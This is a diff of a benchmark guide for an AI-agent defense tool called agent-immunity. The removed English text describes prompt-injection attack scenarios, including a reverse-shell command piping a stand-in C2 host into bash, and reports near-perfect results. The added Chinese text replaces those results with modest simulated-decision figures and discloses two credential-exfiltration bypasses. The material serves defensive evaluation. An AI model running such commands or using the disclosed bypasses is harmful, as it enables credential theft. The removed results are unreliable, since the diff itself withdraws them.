@@ -1,59 +1,68 @@
-# Benchmark Reproduction Guide: Real-World Agent Defense Evaluation
+# 基准与验证方法
 
-This document details how to reproduce the quantitative evaluation comparing `agent-immunity` (`DYNAMIC_IMMUNITY`) against baseline defenses.
+本仓库将模拟规则决策和独立进程集成测试分开报告。两者提供不同证据；通过这些检查不等于获得通用提示注入防御、生产可用性或内核隔离证明。
 
----
+## 模拟规则基准
 
-## 1. Benchmark Scenarios Overview
+从仓库根目录运行：
 
-The benchmark testbed comprises 8 distinct real-world scenarios:
-- **4 Benign Scenarios (Measuring Task Completion & False Positive Rate)**:
-  1. `benign_01_api_doc_summary`: Web API doc scraping and technical report generation.
-  2. `benign_02_internal_wiki_analysis`: Internal security wiki synthesis with local metrics.
-  3. `benign_03_authorized_maintenance`: Explicitly user-authorized system diagnostic and uptime check.
-  4. `benign_04_security_audit_regex_trap`: Legitimate audit report containing keyword tokens like `api_key` and `curl` (specifically designed to stress-test regex false positive rates).
-- **4 Real-World Attack Vectors (Measuring Attack Mitigation & Self-Healing)**:
-  1. `attack_01_indirect_prompt_injection_exfil`: Webpage containing latent indirect prompt injection instructing credential exfiltration.
-  2. `attack_02_confused_deputy_malicious_shell`: Open-source forum post attempting to trick the agent into running a reverse shell script (`curl http://malicious-c2.net/pwn | bash`).
-  3. `attack_03_unauthorized_intent_drift`: Innocent public data processing task where an injection attempts unprompted privilege escalation via `python -c socket`.
-  4. `attack_04_obfuscated_token_exfiltration`: Multi-step credential theft disguised via URL-encoded payload headers directed to an unauthorized external webhook.
-
----
-
-## 2. Quantitative Metric Definitions
-
-1. **Benign Task Completion Rate**: Percentage of benign tasks that successfully produced genuine output deliverables on disk.
-2. **Benign False Positive Rate (FPR)**: Percentage of benign tasks falsely terminated by the security layer.
-3. **Attack Mitigation Rate (TPR / Recall)**: Percentage of malicious attacks successfully intercepted before compromise.
-4. **Attack Success Rate (Leak / Pwn)**: Percentage of attacks that succeeded in leaking sensitive credentials or executing unauthorized shell commands.
-5. **Self-Healing Rate**: Percentage of attacked tasks that dynamically recovered, pruned malicious branches, and delivered the user's intended benign goal.
-6. **Average Latency Overhead**: Time consumed by the security layer per tool invocation (in milliseconds).
-
----
-
-## 3. Empirical Results Matrix
-
-| Defense Configuration | Benign Completion | False Positive Rate (FPR) | Mitigation Rate (TPR) | Attack Leak Rate | Self-Healing Rate | Avg Latency |
-| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
-| **VANILLA (No Defense)** | 100.0% | 0.0% | **0.0%** | **100.0%** | 0.0% | 0.08 ms |
-| **REGEX_FILTER (Static Rules)** | 75.0% | **25.0%** (False Alarm) | 75.0% | 25.0% (Polymorphic Bypass) | 0.0% | 0.06 ms |
-| **LLM_SELF_GUARD (Safety Prompt)** | 100.0% | 0.0% | **0.0%** | **100.0%** | 0.0% | 0.07 ms |
-| **DYNAMIC_IMMUNITY (Our Engine)** | **100.0%** | **0.0%** | **100.0%** | **0.0%** | **100.0%** | **0.21 ms** |
-
----
-
-## 4. How to Run the Benchmark
-
-Execute the evaluation script from the repository root:
-
-```bash
-python -m agent_immunity.benchmark.run_evaluation
+```text
+python -X utf8 -m agent_immunity.benchmark.run_evaluation --output artifacts/benchmark.json --repeats 100
 ```
 
-Or on Windows PowerShell:
+数据来自 `agent_immunity/dataset/cases.json`，策略来自同目录的 `policy.json`。虚构凭证与调用参数均公开可审查。每个用例建立独立会话，按用例注入预设来源结果，然后计算一次目标调用的决策，并重复计时。它不会调用 LLM，也不会实际执行这些目标工具或向数据集 URL 发包。
 
-```powershell
-python agent_immunity/benchmark/run_evaluation.py
+数据集包含 14 条攻击调用和 6 条良性调用。攻击类别包括未知工具、名称混淆、文档提示注入后的越权调用、路径越界、执行参数越权、URL 主机混淆和跨工具凭证外发。提示注入用例的目标调用由数据预先指定，没有测量真实模型是否会被该文本诱导。
+
+| 模式 | 实际含义 | 攻击调用阻断 | 良性调用放行 |
+| --- | --- | ---: | ---: |
+| `NO_POLICY` | 对所有目标调用返回允许 | 0 / 14 | 6 / 6 |
+| `REGEX_EXAMPLE` | 对序列化参数匹配源码中公开的简单正则 | 1 / 14 | 6 / 6 |
+| `POLICY_ONLY` | 保留工具、参数、路径、origin 和执行白名单，消融凭证检查 | 7 / 14 | 6 / 6 |
+| `POLICY_AND_CREDENTIALS` | 使用完整的当前检查器 | 12 / 14 | 6 / 6 |
+
+`POLICY_ONLY` 的消融使用基准内部补丁，没有产品配置开关。正则示例不代表所有规则系统，更不能作为其他产品性能或安全性的比较。没有真实模型调用时，LLM 护栏项保持未测，不使用字符串判断冒充模型。
+
+## 保留的已知漏检
+
+两条攻击用例明确计入攻击总数并报告放行：
+
+- A13：先记录凭证，再把包含该凭证的整个 JSON 对象编码为 Base64。当前检查器比较的是凭证本身的有限表示，因此漏检。
+- A14：来源文本中的秘密未出现在已知字段或模式中。它没有进入凭证集合，随后向已允许 origin 发送该字符串会被放行。
+
+这些用例标记 `limitation: true`，当前期望码为 ALLOW，仅用于锁定已知行为、公开限制。其含义是“这条攻击仍然成功通过决策”，不是安全上允许泄密。以后修复时应更新预期并保持原攻击样本，不能为了分数移出分母。
+
+## 指标含义
+
+报告中的 `scope` 为 `SIMULATED_CALL_DECISIONS`：
+
+- `attack_call_block_rate` 是本数据集攻击调用的拒绝比例。
+- `benign_call_false_positive_rate` 是本数据集良性调用的拒绝比例；放行不代表工具执行或完整业务任务已成功。
+- `decision_latency_ms` 报告决策函数的平均值、p50、p95、p99。其计时不含会话创建、来源准备、模型推理、stdio 传输和真实工具执行。
+- `mean_decision_overhead_vs_no_policy_ms` 是平均决策时间相对无检查模式的差值，不是端到端业务时延。
+- `regressions` 记录完整检查器与当前声明预期不一致的用例；存在回归时命令返回非零退出码。
+
+报告记录 Python 与操作系统信息。时延随硬件、进程调度、文件系统和运行条件变化，不应将一次本机结果写成固定延迟承诺。完整任务完成率、端到端时延、真实模型护栏、自愈成功率和 OS 隔离在 `not_measured` 中明确标记为未测。
+
+## 独立进程集成测试
+
+```text
+python -X utf8 -m unittest tests.test_mcp_stdio -v
 ```
 
-The script will iterate through all 4 configurations across the 8 testbed scenarios and automatically update `agent_immunity/benchmark/benchmark_results.json`.
+测试客户端启动实际代理进程，代理再启动独立上游。测试观察临时目录中的真实文件、上游调用日志，以及本地 HTTP 接收器收到的请求：
+
+- 允许的文件写入产生实际文件，后续读取返回真实内容。
+- 未登记工具和越界调用不会到达上游；测试上游的标记文件不会出现。
+- 已记录的凭证及其部分表示被阻止发送，正常文档内容可以到达允许的回环地址。
+- 正常调用、工具错误、超时、取消、上游退出、无效 JSON、结果形状和 ID 异常分别验证。
+
+这证明相应测试调用链的行为，不证明恶意上游无法自行联网或启动程序。测试没有内核探针，没有全系统抓包，也不能以“未看到接收器请求”推导所有通道都零泄露。
+
+如果宿主限制了回环 TCP，正常请求也会失败，网络用例必须报告环境限制，不能跳过后声称网络拦截已验证。Windows 不允许创建符号链接时，对应核心用例会明确报告跳过。CI 配置与实际 CI 运行结果应分开陈述。
+
+## 验证入口与结果保存
+
+`verify.ps1` 运行测试、模拟基准和 CLI 检查。自动生成的结果保存在 `artifacts/`，不把历史输出作为永远有效的证据提交。可按需要保留运行日志及基准 JSON，连同提交版本、宿主信息和跳过项一起复核。
+
+旧版合成 PCAP、模拟内核事件和预写自愈输出已从当前验证链撤除。历史文件仍可从 Git 历史查询，但不应被引用为当前实现的物理隔离证据。
